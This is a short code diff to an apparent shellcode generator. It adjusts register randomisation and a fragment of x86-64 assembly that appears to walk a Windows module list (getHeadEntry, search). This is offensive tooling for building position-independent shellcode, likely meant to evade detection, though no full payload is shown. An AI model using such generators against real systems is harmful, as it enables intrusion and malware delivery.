@@ -69,19 +69,14 @@ class Shellcode():
         """
 
         if self.randomize_regs:
-            self.map.exclusion_list = ["rsp", "rax", "rbp", "rdx"]
+            self.map.exclusion_list = ["rsp", "rax", "rbp", "rdx", "rcx", "cx"]
             full_map = self.map.get_full_mapping()
-            rcx, r8, rdi, rsi = self.map.gen_regs(4, 64)
+            r8, rdi, rsi = self.map.gen_regs(3, 64)
 
-            print(f"RCX => {rcx}")
             print(f"R8  => {r8}")
             print(f"RDI => {rdi}")
             print(f"RSI => {rsi}")
 
-            rax = "rax"
-
-            cx = full_map[rcx][1]
-            dl = self.map.gen_regs(1, 8)[0]
         else:
             rcx, r8, rdi, rax, rsi, cx, dl = "rcx", "r8", "rdi", "rax", "rsi", "cx", "dl"
 
@@ -114,7 +109,7 @@ getHeadEntry:
     mov {rdi}, [{rdi} + 0x30]
 search:
     xor rcx, rcx
-    mov {rax}, [{rdi} + 0x10]
+    mov rax, [{rdi} + 0x10]
     mov {rsi}, [{rdi} + 0x40]
     mov {rdi}, [{rdi}]
     cmp [{rsi} + 0x18], cx
